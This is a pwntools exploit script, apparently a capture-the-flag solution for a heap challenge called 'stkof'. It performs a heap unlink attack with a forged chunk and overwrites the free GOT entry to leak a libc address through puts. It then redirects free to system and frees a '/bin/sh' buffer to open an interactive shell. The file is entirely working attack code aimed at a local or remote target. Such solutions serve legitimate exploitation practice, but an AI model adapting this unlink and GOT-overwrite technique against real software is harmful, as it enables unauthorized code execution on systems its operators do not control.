# coding:utf-8
from pwn import *
from pwnlib.adb.adb import interactive
context.log_level = 'debug'

proc_name = 'stkof'
islocal = 1
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 29990)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def create(size):
    p.sendline("1")
    p.sendline(str(size))
    p.recvuntil('OK')

def edit(idx, content):
    p.sendline("2")
    p.sendline(str(idx))
    p.sendline(str(len(content)))
    p.send(content)
    p.recvuntil("OK")

def delete(idx):
    p.sendline("3")
    p.sendline(str(idx))

def show(idx):
    p.sendline("4")
    p.sendline(str(idx))
    p.recvuntil("OK")

def leak():
    global system_addr
    heaparray_ptr = 0x602140 + 0x10
    fd = heaparray_ptr - 0x18   
    bk = heaparray_ptr - 0x10
    
    create(0x20) #1
    # debug(0)
    create(0x30) #2
    # debug(0)
    create(0x80) #3
    # debug(0) 
    create(0x30) #4
    # debug(0) 

    # fake chunk
    payload1  = p64(0) + p64(0x30)
    payload1 += p64(fd) + p64(bk)
    payload1 += 'a'*0x10
    payload1 += p64(0x30) + p64(0x90) 

    edit(2, payload1)
    # debug(0) 
    delete(3) # unlink
    # debug(0)
    # pause()
    puts_got = elf.got['puts']
    puts_plt = elf.plt['puts']
    free_got = elf.got['free']
    #atoi_got = elf.got['atoi']
    payload2  = 'a' * 0x10 
    payload2 += p64(free_got) + p64(puts_got)

    edit(2, payload2) #target-0x8
    # debug(0)
    
    payload3 = p64(puts_plt)
    edit(1, payload3) # global[1]
    # debug(0)
    delete(2)     # trigger leak
    # debug(0)
    puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))

    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']

    log.success('puts_addr => ' + hex(puts_addr))
    log.success('libc_base => ' + hex(libc_base))
    log.success('system_addr =>' + hex(system_addr))

def pwn():
    payload4 = p64(system_addr)
    edit(1, payload4) #global[1]
    # debug(0)
    edit(4, '/bin/sh\x00') #global[4]
    # debug(0)
    delete(4)     #trigger
    # debug(0)
    pause()
    p.interactive()

if __name__ == '__main__':
    leak()
    pwn()